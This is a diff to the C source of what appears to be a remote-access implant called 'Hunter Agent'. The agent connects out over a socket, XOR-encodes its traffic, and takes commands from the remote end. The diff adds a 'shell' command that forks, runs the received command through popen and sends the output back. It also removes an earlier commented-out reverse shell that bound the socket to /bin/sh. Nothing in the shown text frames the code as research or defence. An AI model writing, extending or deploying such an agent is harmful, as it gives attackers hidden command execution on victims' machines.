@@ -30,56 +30,67 @@ int main(void)
             connect(sock, (struct sockaddr*)&sa, sizeof(sa));
     } while (connection_established != 0);
 
-    char* xorhello = XOR("Hunter Agent 1.0\n", key, 17, keylen);
-    write(sock, xorhello, 17);
-    free(xorhello);
+	char* xorhello = XOR("Hunter Agent v1.0\n", key, 18, keylen);
+	write(sock, xorhello, 18);
 
-    while (connection_established == 0) {
-        while ((n = read(sock, buf, MAXBUF)) > 0) {
-            char* xorbuf = XOR(buf, key, n, keylen);
-            printf("Buffer is: %s\n", xorbuf);
-            // TODO: Revamp argument parsing (there's a better way! :)
-            if (strncmp(xorbuf, "help\n", 5) == 0) {
-                char* xorhelp = XOR(MSG_HELP, key, strlen(MSG_HELP), keylen);
-                write(sock, xorhelp, strlen(MSG_HELP));
-                free(xorhelp);
-            }
+	while (connection_established == 0)
+	{
+		while((n = read(sock, buf, MAXBUF)) > 0)
+		{
+			char* xorbuf = XOR(buf, key, n, keylen);
+			// TODO: Revamp argument parsing (there's a better way! :)
+			if(strncmp(xorbuf, "help\n", 5) == 0)
+			{
+				char* xorhelp = XOR(MSG_HELP, key, strlen(MSG_HELP), keylen);
+				write(sock, xorhelp, strlen(MSG_HELP));
+			}
+			
+			else if(str_starts_with(xorbuf, "shell") == 1)
+			{
 
-            // TODO: Make proper shell agent command
-            /*
-            else if(strncmp(buf, "shell\n", 6) == 0)
-            {
+				int status = 0;
+				pid_t wpid, child_pid;
+				FILE* fp;
+				
+				
+				char* cmd = split(xorbuf, " ");			
+	
+				if((child_pid = fork()) == 0)
+				{
+					char shell_msg[50];
+					snprintf(shell_msg, 50, "\n[+] Executing command on PID %i\n\n", getpid());
+					char* xorshellmsg = XOR(shell_msg, key, strlen(shell_msg), keylen);
+					write(sock, xorshellmsg, strlen(shell_msg));
 
-                    int status = 0;
-                    pid_t wpid, child_pid;
+					// Create a child process and run command inside of it
+					fp = popen(cmd, "r");
+					if(fp == NULL) {
+					    char* error = "Failed to run command\n";
+					    char* xorerror = XOR(error, key, strlen(error), keylen);
+					    write(sock, xorerror, strlen(error));
+					    
+					}
+					char path[2050];
+					char command[12000];
+					while (fgets(path, sizeof(path), fp) != NULL) {
+					    strcat(command, path);
+					}
+					char* xordata = XOR(command, key, strlen(command), keylen);
+					write(sock, xordata, strlen(command));
+					free(xordata);
+					
+					exit(EXIT_SUCCESS);
+				}
+				// Make the parent process wait for child process to terminate
+		//		while ((wpid = wait(&status)) > 0);
 
-                    char* const argv[] = {"/bin/sh", NULL};
-                    if((child_pid = fork()) == 0)
-                    {
-                            char shell_msg[50];
-                            snprintf(shell_msg, 50, "\nReverse shell session
-            started on PID %i\n", getpid()); write(sock, shell_msg,
-            strlen(shell_msg));
-
-                            dup2(sock, 0);
-                            dup2(sock, 1);
-                            dup2(sock, 2);
-                            // Create a child process and start shell inside of
-            it execve("/bin/sh", argv, NULL); exit(EXIT_SUCCESS);
-                    }
-                    // Make the parent process wait for child process to
-            terminate while ((wpid = wait(&status)) > 0);
-
-                    write(sock, MSG_EXIT_RSHELL, strlen(MSG_EXIT_RSHELL));
-            }
-*/
-            else if (strncmp(buf, "exit\n", 5) == 0) {
-                char* xorexit = XOR(MSG_EXIT_CMD, key, strlen(MSG_EXIT_CMD), keylen);
-                write(sock, xorexit, strlen(MSG_EXIT_CMD));
-                free(xorexit);
-                free(xorbuf);
-                exit(EXIT_SUCCESS);
-            }
+			}
+			else if(strncmp(xorbuf, "\n", 1) == 0)
+			{
+				char* xornewline = XOR("\n", key, 1, keylen);
+				write(sock, xornewline, 1);
+		    free(xornewline);
+			}
 
             else {
                 char* xorinvalid = XOR(MSG_INVALID, key, strlen(MSG_INVALID), keylen);
